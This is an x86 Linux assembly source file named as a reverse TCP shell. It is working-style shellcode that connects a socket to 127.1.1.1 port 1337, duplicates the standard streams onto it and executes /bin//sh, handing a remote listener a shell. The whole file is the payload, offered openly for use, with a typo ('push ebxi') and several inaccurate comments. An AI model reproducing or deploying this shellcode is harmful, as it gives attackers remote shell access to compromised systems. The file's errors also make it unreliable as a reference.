; Filename: revTcpSh.nasm
; Author:   boku
global _start
section .text
_start:

xor eax, eax      ; Clear EAX Register. EAX = 0x00000000
mov al, 0x66      ; EBX = 0x66 = 102. SYSCAL 102 = socketcall
xor ebx, ebx      ; Clear EBX Register. EBX = 0x00000000
inc ebx	          ; EBX = 0x1 = socket() // Create a socket
xor ecx, ecx      ; Clear ECX Register. ECX = 0x00000000
push ecx          ; ECX[2] = int protocol = 0. 
push ebxi         ; ECX[1] - int type = SOCK_STREAM = 0x1. 
push byte 0x2     ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. 
mov ecx, esp      ; Point the ECX Register to the Top of the stack
int 0x80          ; Execute the socket() System Call

xchg esi, eax     ; save the "sockfd" generated from the socket above 

xor eax, eax
inc ebx
push 0x0101017f   ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
push word 0x3905  ; ARG[1]. This is for the TCP Port 1337.
push bx           ; ARG[0]. Push the value 2 onto the stack for AF_INET.
mov ecx, esp      ; Now all that is left is to point ECX to the top of the 
                  ;  loaded stack and let it do it's thing.

push 0x10         ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
push ecx          ; ECX[1] - const struct sockaddr *addr 
push esi          ; ECX[0] - int sockfd. Saved in ESI earlier

mov ecx, esp      ; Point ECX to the top of the Stack.
inc ebx	          ; Connect() value for the socketcall() SYSCAL
mov al, 0x66      ; socketcall() system call
int 0x80          ; System Call Interrupt 0x80 - Executes bind(). 
xchg ebx, esi

xor ecx, ecx
dup2loop:
mov al, 0x3f      ; EAX Syscall dup2() for STDIN STDOUT STDERR
int 0x80          ; execute dup2()
inc ecx           ; increase EAX by 1
cmp cl, 0x4       ; compare cl to 4, if it is 4 the flag will be set
jne dup2loop      ; Jumps to the specified location flag is set

xor edx, edx
push edx          ; Push NULL onto the stack 
push 0x68732f2f   ; Push "hs//" onto the stack 
push 0x6e69622f   ; Push "nib/" onto the stack 
mov ebx, esp      ; point ebx to stack
mov al, 0xb       ; execve
xor ecx, ecx
int 0x80          ; execute execve
